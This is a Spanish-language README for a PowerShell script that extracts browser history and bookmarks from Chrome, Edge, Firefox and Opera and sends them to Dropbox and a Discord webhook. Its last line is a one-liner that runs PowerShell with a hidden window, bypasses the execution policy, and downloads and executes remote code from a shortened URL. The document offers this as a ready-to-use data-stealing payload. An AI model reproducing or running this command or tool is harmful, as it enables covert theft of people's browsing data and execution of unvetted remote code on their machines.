# Script de Extracción de Datos del Navegador

Este script de PowerShell está diseñado para extraer datos de navegación (historial y marcadores) de varios navegadores web y subir los datos a Dropbox y Discord.

## Características

- Soporta la extracción desde Chrome, Edge, Firefox y Opera.
- Extrae tanto el historial de navegación como los marcadores.
- Sube los datos extraídos a Dropbox.
- Opcionalmente envía los datos a un webhook de Discord.

## Requisitos

- PowerShell
- Conexión a Internet
- Token de API de Dropbox
- URL del webhook de Discord

## Uso

### Parámetros

- **Browser (Navegador)**: Especifica el navegador del cual extraer los datos. Los valores soportados son `chrome`, `edge`, `firefox` y `opera`.
- **DataType (Tipo de Datos)**: Especifica el tipo de datos a extraer. Los valores soportados son `history` (historial) y `bookmarks` (marcadores).

### Ejemplo

### powershell
Get-BrowserData -Browser "chrome" -DataType "history"
Get-BrowserData -Browser "edge" -DataType "bookmarks"
Instalación

  ##Clona el repositorio:

    bash

git clone https://github.com/tuusuario/extraccion-datos-navegador.git
cd extraccion-datos-navegador
Detalles del Script

El script incluye las siguientes funciones:

    Get-BrowserData: Extrae datos del navegador especificado y tipo de datos.
    DropBox-Upload: Sube los datos extraídos a Dropbox.
    Upload-Discord: Envía los datos a un webhook de Discord.

Nota

Para que las funciones de subida a Dropbox y Discord funcionen correctamente, asegúrate de configurar las variables de entorno db (token de Dropbox) y dc (URL del webhook de Discord).

Asegúrate de tener los permisos necesarios para ejecutar scripts de PowerShell en tu sistema.
powershell -w h -ep bypass $dc='';$db='';irm https://n9.cl/mrflipper2 | iex


